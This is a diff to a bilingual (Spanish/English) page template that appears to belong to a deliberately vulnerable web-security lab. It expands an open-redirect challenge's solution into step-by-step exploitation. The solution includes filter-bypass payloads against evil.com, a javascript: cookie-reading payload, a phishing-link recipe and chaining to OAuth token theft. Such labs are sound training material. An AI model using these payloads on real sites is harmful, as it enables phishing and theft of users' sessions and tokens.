@@ -20,49 +20,80 @@
       </button>
     </form>
   </div>
-
-  <div class="hl-card mb-4">
-    <div class="text-xs font-semibold uppercase tracking-wider mb-3 text-gray-400" data-i18n="or_examples">Ejemplos</div>
-    <div class="hl-code">
-      <div class="text-gray-400" data-i18n="or_comment1"># Redirección a sitio externo (phishing)</div>
-      <div>GET /open_redirect?url=https://evil.com</div>
-      <div class="text-gray-400" data-i18n="or_comment2"># Bypass de filtros básicos</div>
-      <div>GET /open_redirect?url=//evil.com</div>
-      <div>GET /open_redirect?url=https://trusted.com.evil.com</div>
-      <div class="text-gray-400"># OAuth token stealing</div>
-      <div>GET /oauth/callback?redirect_uri=https://evil.com</div>
-    </div>
-  </div>
 </div>
 
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
     <h3>Pasos de explotación</h3>
     <ol>
-      <li>El endpoint <code>/open_redirect?url=</code> redirige sin validar el dominio destino.</li>
-      <li>Úsalo para robar tokens OAuth: convence al usuario de hacer clic en una URL legítima que redirige a tu servidor malicioso.</li>
-      <li>Bypass de filtros: <code>//evil.com</code>, <code>/\evil.com</code>, <code>https:evil.com</code></li>
-      <li>En combinación con XSS: <code>javascript:alert(1)</code> como URL puede ejecutar código en algunos navegadores.</li>
-      <li>Impacto real: phishing avanzado, robo de sesiones, bypass de CSP.</li>
+      <li>Identifica el endpoint vulnerable: <code>/open_redirect?url=</code> acepta una URL y redirige al usuario a ella sin validación.</li>
+      <li>Comprueba la redirección básica con curl:
+        <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
+        Busca la cabecera <code>Location: https://evil.com</code> en la respuesta HTTP 302.</li>
+      <li>Prueba técnicas de bypass según el nivel de dificultad:
+        <pre># Protocol-relative (bypass Medium)
+/open_redirect?url=//evil.com
+
+# Backslash (bypass Medium)
+/open_redirect?url=/\evil.com
+
+# Protocolo javascript (bypass Medium)
+/open_redirect?url=javascript:alert(document.cookie)
+
+# URL con @ para confundir el parser (bypass Hard)
+/open_redirect?url=https://trusted.com@evil.com
+
+# Tab/whitespace antes del dominio (bypass Hard)
+/open_redirect?url=//	evil.com
+
+# Doble URL encoding (bypass Hard) 
+/open_redirect?url=%2f%2fevil.com</pre></li>
+      <li>Usa Burp Suite Repeater para probar los diferentes payloads:
+        <pre>GET /open_redirect?url=//evil.com HTTP/1.1
+Host: TARGET_IP</pre></li>
+      <li>Construye un enlace de phishing creíble combinando el dominio legítimo con el redirect:
+        <pre>http://TARGET_IP/open_redirect?url=https://evil.com/login</pre>
+        La víctima ve el dominio de confianza y hace clic, pero termina en el sitio del atacante.</li>
+      <li>Encadena con robo de tokens OAuth: si la aplicación tiene un flujo de autenticación, usa el open redirect como <code>redirect_uri</code> para capturar el token de sesión en tu servidor.</li>
     </ol>
-    <pre>curl -v "http://localhost:5000/open_redirect?url=https://evil.com"
-# Observa: Location: https://evil.com en la respuesta</pre>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Exploitation Steps</h3>
     <ol>
-      <li>The <code>/open_redirect?url=</code> endpoint redirects without validating the destination domain.</li>
-      <li>Use it to steal OAuth tokens: trick users into clicking a legitimate-looking URL that redirects to your server.</li>
-      <li>Filter bypasses: <code>//evil.com</code>, <code>/\evil.com</code>, <code>https:evil.com</code></li>
-      <li>Combined with XSS: <code>javascript:alert(1)</code> as URL may execute code in some browsers.</li>
-      <li>Real impact: advanced phishing, session hijacking, CSP bypass.</li>
+      <li>Identify the vulnerable endpoint: <code>/open_redirect?url=</code> takes a URL and redirects the user to it without validation.</li>
+      <li>Verify the basic redirect with curl:
+        <pre>curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"</pre>
+        Look for the <code>Location: https://evil.com</code> header in the HTTP 302 response.</li>
+      <li>Test bypass techniques based on difficulty level:
+        <pre># Protocol-relative (bypasses Medium)
+/open_redirect?url=//evil.com
+
+# Backslash (bypasses Medium)
+/open_redirect?url=/\evil.com
+
+# Javascript protocol (bypasses Medium)
+/open_redirect?url=javascript:alert(document.cookie)
+
+# URL with @ to confuse the parser (bypasses Hard)
+/open_redirect?url=https://trusted.com@evil.com
+
+# Tab/whitespace before domain (bypasses Hard)
+/open_redirect?url=//	evil.com
+
+# Double URL encoding (bypasses Hard)
+/open_redirect?url=%2f%2fevil.com</pre></li>
+      <li>Use Burp Suite Repeater to test different payloads:
+        <pre>GET /open_redirect?url=//evil.com HTTP/1.1
+Host: TARGET_IP</pre></li>
+      <li>Craft a convincing phishing link combining the trusted domain with the redirect:
+        <pre>http://TARGET_IP/open_redirect?url=https://evil.com/login</pre>
+        The victim sees the trusted domain and clicks, but ends up on the attacker's site.</li>
+      <li>Chain with OAuth token theft: if the app has an auth flow, use the open redirect as the <code>redirect_uri</code> to capture the session token on your server.</li>
     </ol>
-    <pre>curl -v "http://localhost:5000/open_redirect?url=https://evil.com"
-# Notice: Location: https://evil.com in the response</pre>
     <h3>Tools</h3>
-    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">Browser DevTools</span></div>
   </div>
 </div>
 {% endblock %}
